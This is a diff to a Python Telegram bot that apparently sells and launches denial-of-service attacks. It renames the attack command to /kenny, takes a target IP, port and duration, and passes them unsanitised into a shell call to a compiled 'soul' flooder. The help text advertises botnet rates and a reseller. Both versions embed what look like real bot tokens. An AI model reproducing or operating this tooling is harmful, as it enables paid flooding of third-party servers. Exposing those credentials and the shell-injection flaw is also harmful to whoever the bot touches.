@@ -6,7 +6,7 @@ import datetime
 import os
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7843468016:AAEqlsTKmfIwwxv0cvTxltyquSF5KMDyYUY')
+bot = telebot.TeleBot('7630863936:AAFgqlqbBRHHehurnFO9FJAXzPrXtVAoIg0')
 
 # Admin user IDs
 admin_id = {"7541279033", "12345667", "12345667"}
@@ -201,14 +201,14 @@ soul_cooldown = {}
 
 COOLDOWN_TIME =0
 
-@bot.message_handler(commands=['soul'])
+@bot.message_handler(commands=['kenny'])
 def handle_soul(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         if user_id not in admin_id:
             
             if user_id in soul_cooldown and (datetime.datetime.now() - soul_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /attack Command Again."
+                response = "You Are On Cooldown . Please Wait 3sec Before Running The /kenny Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -225,11 +225,11 @@ def handle_soul(message):
                 record_command_logs(user_id, '/soul_compiled', king, soulking, time)
                 log_command(user_id, king, soulking, time)
                 start_attack_reply(message, king, soulking, time)  
-                full_command = f"./soul_compiled {king} {soulking} {time} 900"
+                full_command = f"./soul_compiled {king} {soulking} {time} 300"
                 subprocess.run(full_command, shell=True)
                 response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- king: {king} soulking: {soulking} soulking: {time}"
         else:
-            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /attack <king> <soulking> <time>"  
+            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /kenny <ip> <port> <time>"  
     else:
         response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - RESELLER ."
 
@@ -260,7 +260,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /attack : Method For soul Servers. 
+💥 /kenny : Method For kenny Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
